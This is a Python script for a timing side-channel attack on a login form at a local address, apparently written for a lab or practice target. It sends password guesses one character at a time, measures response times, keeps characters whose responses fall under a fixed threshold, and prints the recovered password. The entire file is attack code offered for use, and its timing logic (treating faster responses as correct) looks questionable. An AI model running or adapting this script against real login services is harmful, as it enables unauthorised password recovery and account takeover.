import requests
import time

url = 'http://127.0.0.1:8000/login'

password_guess = ''

password_length = 14  

def measure_response_time(guess):
    data = {'password': guess}
    start_time = time.time()
    response = requests.post(url, data=data)
    end_time = time.time()
    response_time = end_time - start_time
    return response_time

for i in range(password_length):
    print(f"Guessing character {i + 1}/{password_length}")
    
    for c in 'abcdefghijklmnopqrstuvwxyz0123456789':  
        guess = password_guess + c  
        response_time = measure_response_time(guess)
        print(f"Testing password guess: {guess} - Response time: {response_time:.5f} seconds")
        
        if response_time <  0.2:  
            print(f"Found correct character at position {i + 1}: {c}")
            password_guess += c
            break  

print(f"Exploited password: {password_guess}")
